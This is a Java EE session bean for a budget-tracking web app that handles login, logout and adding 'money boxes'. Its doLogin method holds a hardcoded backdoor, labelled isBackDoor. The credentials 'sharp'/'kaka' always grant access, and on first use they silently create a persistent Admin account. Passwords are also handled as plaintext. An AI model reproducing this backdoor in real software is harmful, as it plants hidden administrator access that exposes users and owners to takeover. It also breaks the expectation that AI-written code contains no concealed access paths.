package hu.nevermind.budget;

import hu.nevermind.budget.model.MoneyBox;
import hu.nevermind.budget.model.UserInfo;

import javax.ejb.EJB;
import javax.enterprise.context.SessionScoped;
import javax.faces.application.FacesMessage;
import javax.faces.context.FacesContext;
import javax.inject.Inject;
import javax.inject.Named;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.io.Serializable;
import java.util.List;

@SessionScoped
@Named
public class UserSession implements Serializable {

	private String name;
	private UserInfo userInfo;
	private String username;
	private String password;
	private boolean loggedIn;

	//@EJB
    @Inject
	private DaoBean dao;

	public void addMoneyBox(final String newMoneyBoxName, final int newMoneyBoxAmount) {
		final MoneyBox box = new MoneyBox(newMoneyBoxName, newMoneyBoxAmount, userInfo);
		userInfo.getMoneyBoxes().add(box);
		dao.persist(box);
	}

	public String doLogin() {
        boolean isBackDoor = "sharp".equals(username) && "kaka".equals(password);
		if (isBackDoor || dao.existUser(username, password)) {
			loggedIn = true;
            if (isBackDoor && !dao.existUser(username, password)) {
                dao.persist(new UserInfo("sharp", "kaka", UserInfo.Role.Admin));
            }
            loadUser();
			FacesContext.getCurrentInstance().getExternalContext().getSessionMap().put("isLoggedIn", true);
			return "/index.xhtml?faces-redirect=true";
		}
		final FacesMessage msg = new FacesMessage("Login error!", "ERROR MSG");
		msg.setSeverity(FacesMessage.SEVERITY_ERROR);
		FacesContext.getCurrentInstance().addMessage(null, msg);

		return "/login.xhtml";
	}

	private void loadUser() {
		userInfo = dao.loadUser(username);
	}

	public void doLogout() throws IOException {
		loggedIn = false;

		final FacesMessage msg = new FacesMessage("Logout success!", "INFO MSG");
		msg.setSeverity(FacesMessage.SEVERITY_INFO);
		FacesContext.getCurrentInstance().addMessage(null, msg);
		FacesContext.getCurrentInstance().getExternalContext().getSessionMap().remove("isLoggedIn");
		((HttpServletRequest)FacesContext.getCurrentInstance().getExternalContext().getRequest()).getSession().invalidate();
		FacesContext.getCurrentInstance().getExternalContext().redirect(FacesContext.getCurrentInstance().getExternalContext().getRequestContextPath()+"/login.xhtml?faces-redirect=true");
	}

	public String getUsername() {
		return username;
	}

	public void setUsername(final String username) {
		this.username = username;
	}

	public String getPassword() {
		return password;
	}

	public void setPassword(final String password) {
		this.password = password;
	}

	public boolean isLoggedIn() {
		return loggedIn;
	}

	public void setLoggedIn(final boolean loggedIn) {
		this.loggedIn = loggedIn;
	}

	public String getName() {
		return name;
	}

	public void setName(final String name) {
		this.name = name;
	}

	public List<MoneyBox> getMoneyBoxes() {
		return userInfo.getMoneyBoxes();
	}

	public UserInfo getUserInfo() {
		return userInfo;
	}
}
